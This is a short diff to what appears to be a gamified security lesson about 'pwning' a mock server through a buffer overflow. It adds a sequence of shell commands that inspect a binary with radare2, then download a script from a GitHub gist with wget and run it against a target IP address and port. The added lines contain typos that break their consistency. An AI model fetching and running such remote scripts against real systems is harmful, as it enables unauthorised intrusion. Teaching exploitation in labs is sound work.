@@ -47,6 +47,20 @@ We need to know what assembly does because it is going to help us take down the 
 Alice and Bob need us to take control of a L33k3r server so we can destroy it from the inside out! This is called pwning. So we will be compromising another server to gain access, almost like how we used the File Upload Exploit to gain access to the Global Dessert Vault!
 
 
+ls
+cd secsoft
+ls
+cat bufover-2.c
+cat bufover-2
+r2 -Ad bufover2
+Vpp
+q
+enter
+enter
+wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh
+chmod +x bash32.ch
+./bash32.sh buffer-2 ipaddr port
+
 
 
 
